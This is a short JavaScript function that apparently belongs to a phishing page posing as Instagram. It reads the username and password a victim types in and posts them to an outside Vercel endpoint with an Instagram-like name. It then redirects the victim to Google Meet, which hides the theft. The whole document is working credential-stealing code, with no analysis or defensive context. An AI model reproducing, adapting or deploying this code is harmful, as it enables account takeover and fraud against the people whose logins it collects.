async function sendDataToServer(){
    console.log("Sent data to the server")
    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value
     


    const data  = {
        username:username,
        password:password,
    }

    const res = await fetch("https://instagram-gv00l7i9f-bidxds-projects.vercel.app/save",{
        method: "POST",
        headers:{
            "Content-Type": "application/json",
        },
        body:JSON.stringify(data)
    })

    
    if(username!="" && password !="") window.location.href = "https://meet.google.com/"
}